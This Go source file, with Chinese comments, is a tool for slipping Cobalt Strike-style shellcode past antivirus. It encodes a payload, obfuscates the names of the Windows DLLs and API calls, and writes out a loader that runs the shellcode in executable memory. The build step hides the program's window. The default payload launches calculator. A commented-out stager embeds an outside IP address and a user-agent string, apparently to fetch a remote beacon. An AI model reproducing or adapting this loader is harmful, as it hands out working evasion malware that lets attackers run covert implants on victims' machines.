package main

//1.修改mian.go 31行的shellcode
//2.cmd执行go run main.go 运行本程序

import (	//导入一些包
	"bufio"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"time"
)

func main() {
	bypassGoPath:="bypass.go"	//输出文件名字，默认在相对路径./ 可以修改

	fmt.Println("\t\tlinshao _ cs免杀工具\n---------------------------------------------------------------------------")

	//经过测试， cs上线	32位C 	shellcode	报错！！！可能是我测试机子是64位的关系
	//shellcode:=[]byte{0xfc,0xe8,0x89,0x00,0x00,0x00...}
	//64位shellcode 成功上线
	//shellcode:=[]byte{0xfc,0x48,0x83,0xe4,0x...}

	//弹计算器shellcode, 用于测试
	//shellcode:=[]byte{0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xff,0x57,0x57,0x57,0x57,0x57,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0xe9,0x84,0x00,0x00,0x00,0x5b,0x31,0xc9,0x51,0x51,0x6a,0x03,0x51,0x51,0x68,0x53,0x00,0x00,0x00,0x53,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0xeb,0x70,0x5b,0x31,0xd2,0x52,0x68,0x00,0x02,0x40,0x84,0x52,0x52,0x52,0x53,0x52,0x50,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x89,0xc6,0x83,0xc3,0x50,0x31,0xff,0x57,0x57,0x6a,0xff,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x0f,0x84,0xc3,0x01,0x00,0x00,0x31,0xff,0x85,0xf6,0x74,0x04,0x89,0xf9,0xeb,0x09,0x68,0xaa,0xc5,0xe2,0x5d,0xff,0xd5,0x89,0xc1,0x68,0x45,0x21,0x5e,0x31,0xff,0xd5,0x31,0xff,0x57,0x6a,0x07,0x51,0x56,0x50,0x68,0xb7,0x57,0xe0,0x0b,0xff,0xd5,0xbf,0x00,0x2f,0x00,0x00,0x39,0xc7,0x74,0xb7,0x31,0xff,0xe9,0x91,0x01,0x00,0x00,0xe9,0xc9,0x01,0x00,0x00,0xe8,0x8b,0xff,0xff,0xff,0x2f,0x33,0x49,0x72,0x6e,0x00,0x35,0x4f,0x21,0x50,0x25,0x40,0x41,0x50,0x5b,0x34,0x5c,0x50,0x5a,0x58,0x35,0x34,0x28,0x50,0x5e,0x29,0x37,0x43,0x43,0x29,0x37,0x7d,0x24,0x45,0x49,0x43,0x41,0x52,0x2d,0x53,0x54,0x41,0x4e,0x44,0x41,0x52,0x44,0x2d,0x41,0x4e,0x54,0x49,0x56,0x49,0x52,0x55,0x53,0x2d,0x54,0x45,0x53,0x54,0x2d,0x46,0x49,0x4c,0x45,0x21,0x24,0x48,0x2b,0x48,0x2a,0x00,0x35,0x4f,0x21,0x50,0x25,0x00,0x55,0x73,0x65,0x72,0x2d,0x41,0x67,0x65,0x6e,0x74,0x3a,0x20,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x34,0x2e,0x30,0x20,0x28,0x63,0x6f,0x6d,0x70,0x61,0x74,0x69,0x62,0x6c,0x65,0x3b,0x20,0x4d,0x53,0x49,0x45,0x20,0x38,0x2e,0x30,0x3b,0x20,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x35,0x2e,0x31,0x29,0x0d,0x0a,0x00,0x35,0x4f,0x21,0x50,0x25,0x40,0x41,0x50,0x5b,0x34,0x5c,0x50,0x5a,0x58,0x35,0x34,0x28,0x50,0x5e,0x29,0x37,0x43,0x43,0x29,0x37,0x7d,0x24,0x45,0x49,0x43,0x41,0x52,0x2d,0x53,0x54,0x41,0x4e,0x44,0x41,0x52,0x44,0x2d,0x41,0x4e,0x54,0x49,0x56,0x49,0x52,0x55,0x53,0x2d,0x54,0x45,0x53,0x54,0x2d,0x46,0x49,0x4c,0x45,0x21,0x24,0x48,0x2b,0x48,0x2a,0x00,0x35,0x4f,0x21,0x50,0x25,0x40,0x41,0x50,0x5b,0x34,0x5c,0x50,0x5a,0x58,0x35,0x34,0x28,0x50,0x5e,0x29,0x37,0x43,0x43,0x29,0x37,0x7d,0x24,0x45,0x49,0x43,0x41,0x52,0x2d,0x53,0x54,0x41,0x4e,0x44,0x41,0x52,0x44,0x2d,0x41,0x4e,0x54,0x49,0x56,0x49,0x52,0x55,0x53,0x2d,0x54,0x45,0x53,0x54,0x2d,0x46,0x49,0x4c,0x45,0x21,0x24,0x48,0x2b,0x48,0x2a,0x00,0x35,0x4f,0x21,0x50,0x25,0x40,0x41,0x50,0x5b,0x34,0x5c,0x50,0x5a,0x58,0x35,0x34,0x28,0x50,0x5e,0x29,0x37,0x43,0x43,0x29,0x37,0x7d,0x24,0x45,0x49,0x43,0x41,0x52,0x2d,0x53,0x54,0x41,0x4e,0x44,0x41,0x52,0x44,0x2d,0x41,0x4e,0x54,0x49,0x56,0x49,0x52,0x55,0x53,0x2d,0x54,0x45,0x53,0x54,0x2d,0x46,0x49,0x4c,0x45,0x21,0x24,0x48,0x2b,0x48,0x2a,0x00,0x35,0x4f,0x21,0x50,0x25,0x40,0x41,0x50,0x5b,0x34,0x5c,0x50,0x5a,0x58,0x35,0x34,0x28,0x50,0x5e,0x29,0x37,0x43,0x43,0x29,0x37,0x7d,0x24,0x45,0x49,0x43,0x41,0x52,0x2d,0x53,0x00,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x57,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0xb9,0x00,0x00,0x00,0x00,0x01,0xd9,0x51,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xc6,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0xe8,0xa9,0xfd,0xff,0xff,0x31,0x38,0x32,0x2e,0x39,0x32,0x2e,0x36,0x36,0x2e,0x32,0x32,0x31,0x00,0x00,0x00,0x00,0x00}

	//请修改shellcode,此处默认是弹出计算器	( msfvenom -p windows/x64/exec CMD="calc.exe" -f c )
	shellcode:=[]byte{0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00}

	globlaRandNum:=getRandNum()						//自定义函数,获取一个五位随机数作为编码的密匙
	payload:=enCode(shellcode,globlaRandNum)		//自定义函数,对shellcode每位进行＋globlaRandNum运算，解码后会得到一个可打印字符(unicode码)，函数返回一个表示shellcode的乱码字符串
	str1:=getencode("kernel32.dll",globlaRandNum)//把要用到的几个dll和其中的函数字符串也进行编码加密
	str2:=getencode("ntdll.dll",globlaRandNum)
	str3:=getencode("VirtualAlloc",globlaRandNum)
	str4:=getencode("RtlCopyMemory",globlaRandNum)
	globlaRandNumStr:=strconv.Itoa(globlaRandNum)	//写出bypass.go的时候要把随机数也写出，这里转成string类型

	bypassstr:=getLoderStr(payload,globlaRandNumStr,str1,str2,str3,str4)//自定义函数,此函数传入shellcode，和一些编码过的参数，拼接成加载器，返回具体的go源码文本outstr
	if err,result:=witeFile(bypassGoPath,bypassstr) ;err{	//go语法的if组合语句，witeFile(),自定义函数,返回标志符err和结果信息result, 这句代码相当于if err{}在后面
		fmt.Println(result)															//存在错误打印输出结果
	}else {
		fmt.Println("[info]:\t源码写出成功,请执行命令 go build -ldflags \"-H windowsgui\" "+bypassGoPath+"\t编译可执行文件")	//成功写出bypass.go(加载器)源文件，编译它即可得到bypass.exe
	}
	fmt.Println("---------------------------------------------------------------------------")
}


//对原始shellcode进行编码操作
func enCode(shellcode []byte,globlaRandNum int) string  {
	sb:=strings.Builder{}
	for _,v:=range shellcode{
		sb.WriteString(string(int(v)+globlaRandNum))
	}
	return sb.String()
}
//获取一个五位随机数
func  getRandNum()int{
	s:=fmt.Sprintf("%05v",rand.New(rand.NewSource(time.Now().UnixNano())).Int31n(36000))
	ss:=string(s)
	tmp,_:=strconv.Atoi(ss)
	return tmp
}
//通过生成的随机数对变量名进行编码，返回加密的字符
func getencode(str string,randnum int) string{
	sb:=strings.Builder{}
	for _,v :=range str{
		sb.WriteString(string(v+int32(randnum)))
	}
	return sb.String()
}

//根据路径读取文件
func readFile(filePath string)(bool,string){
	f, err := os.Open(filePath)
	if err != nil {
		return  true,err.Error()
	}
	res,_:=ioutil.ReadAll(f)
	return false,string(res)
}
//根据路径写入文件
func witeFile(filePath,content string)(bool ,string){
	file,err:=os.OpenFile(filePath,os.O_WRONLY|os.O_TRUNC|os.O_CREATE,0644)
	if err!=nil {
		return true,"[err]:\t文件打开失败"+err.Error()
	}else {
		defer file.Close()									//延时调用，结束函数时关闭file句柄
		writer:=bufio.NewWriter(file)						//创建*Writer
		writer.WriteString(content)							//写入
		writer.Flush()										//刷新
		return false,"ok"									//返回成功标志
	}

}
//传入payload 拼接返回加载器源码
func getLoderStr(payload string,globlaRandNumStr string,name1 string,name2 string,name3 string,name4 string)string{
	return `package main
import "syscall"
import "os"
import "unsafe"
import "strings"

const(
	MEM_COMMIT=0x1000
	MEM_RESERVE=0x2000
	PAGE_EXECUTE_READWWRITE=0x40
	globlaRandNum=`+globlaRandNumStr+`
)
var (
	kernel32=syscall.MustLoadDLL(mydecode("`+name1+`"))
	ntdll=syscall.MustLoadDLL(mydecode("`+name2+`"))
	VirtualAlloc=kernel32.MustFindProc(mydecode("`+name3+`"))
	RtlCopyMemory=ntdll.MustFindProc(mydecode("`+name4+`"))
)
func checkErr(err error){
	if err!=nil{
		if err.Error() !="The operation completed successfully."{
			//println("----------错误",err.Error())
			os.Exit(1)
		}
	}
}

func main(){
str:="`+payload+`"
dfsdsfsdfas := make([]byte, 0)
	for _, v := range str {
		dfsdsfsdfas = append(dfsdsfsdfas,byte(v-globlaRandNum))
	}
addr,_,err:=VirtualAlloc.Call(0,uintptr(len(dfsdsfsdfas)),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWWRITE)
	if addr ==0{
		checkErr(err)
	}
	_,_,err2:=RtlCopyMemory.Call(addr,(uintptr)(unsafe.Pointer(&dfsdsfsdfas[0])),uintptr(len(dfsdsfsdfas)))
	checkErr(err2)
	syscall.Syscall(addr,0,0,0,0)
}
func mydecode(str string)string{
	sb:=strings.Builder{}
	for _,v :=range str{
		sb.WriteString(string(v-globlaRandNum))
	}
	return sb.String()
}

`
}


